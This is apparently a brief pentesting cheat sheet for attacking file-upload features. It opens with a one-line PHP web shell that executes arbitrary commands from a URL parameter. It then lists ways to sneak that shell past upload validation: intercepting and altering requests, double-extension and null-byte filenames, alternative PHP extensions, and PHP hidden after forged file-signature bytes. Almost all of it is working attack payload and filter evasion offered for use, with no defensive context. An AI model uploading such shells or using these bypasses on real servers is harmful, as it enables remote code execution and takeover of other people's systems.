```Python
<?php system($_GET['cmd']); ?>
```
### Client-Side
- Intercept request, modify filetype, and filename, and replace data, send modified request
### Server-Side Bypasses
**extensions**
```Python
shell.php.png
shell.php%00.png
shell.phtml
shell.inc
shell.php3
shell.php4
shell.php5
```
**Content-Type**
```Python
kinda useless
```
**magic bytes**
[https://en.wikipedia.org/wiki/List_of_file_signatures](https://en.wikipedia.org/wiki/List_of_file_signatures)
- Intercept request, insert php below magic bytes header, change filetype to php, and send